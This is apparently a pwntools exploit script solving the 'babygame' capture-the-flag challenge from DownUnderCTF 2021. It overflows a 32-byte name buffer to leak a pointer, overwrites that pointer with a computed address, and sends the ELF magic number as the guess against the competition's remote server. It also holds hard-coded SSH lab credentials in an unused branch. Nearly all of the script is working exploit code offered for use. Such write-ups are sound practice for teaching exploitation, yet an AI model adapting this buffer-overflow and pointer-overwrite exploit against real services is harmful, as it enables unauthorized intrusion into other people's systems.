from pwn import ELF, process, ROP, remote, ssh, gdb, cyclic, cyclic_find, log, p64, u64  # Import pwntools
####################
#### CONNECTION ####
####################
LOCAL = False
REMOTETTCP = True
REMOTESSH = False
GDB = False

LOCAL_BIN = './babygame'
REMOTE_BIN = '~/vuln' #For ssh
LIBC = '' #ELF('/lib/x86_64-linux-gnu/libc.so.6') #Set library path when know it

if LOCAL:
    P = process(LOCAL_BIN) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTETTCP:
    P = remote('pwn-2021.duc.tf',31907) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTESSH:
    ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
    p = ssh_shell.process(REMOTE_BIN) # start the vuln binary
    elf = ELF(LOCAL_BIN)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continue
    # You can set breakpoints, for example 'break *main'
    gdb.attach(P.pid, 'b *main')


#####################
#### Find Gadgets ###
#####################

def edit_name(name):
	P.sendlineafter(b'> ',b'1')
	P.sendlineafter(b'to?',name)
	print('change name to ',name.decode('ascii','ignore'))

def print_name():
	P.sendlineafter(b'> ',b'2')
	recv = P.recvline().strip()
	print('Name: ',recv.decode('ascii','ignore'))
	return recv

##############################
##### FINAL EXPLOITATION #####
##############################
P.sendlineafter(b'what is your name?',b'A'*32)
P.recvuntil(b'Invalid choice.')
leak = u64(print_name().strip(b'A').ljust(8,b'\x00'))
binsh = leak+0x7f
print(hex(leak))
print(hex(binsh))
edit_name(b'A'*32+p64(binsh).strip(b'\x00'))
P.sendlineafter(b'> ',b'1337')
P.sendlineafter(b'guess:',str(0x464c457f))
P.interactive()




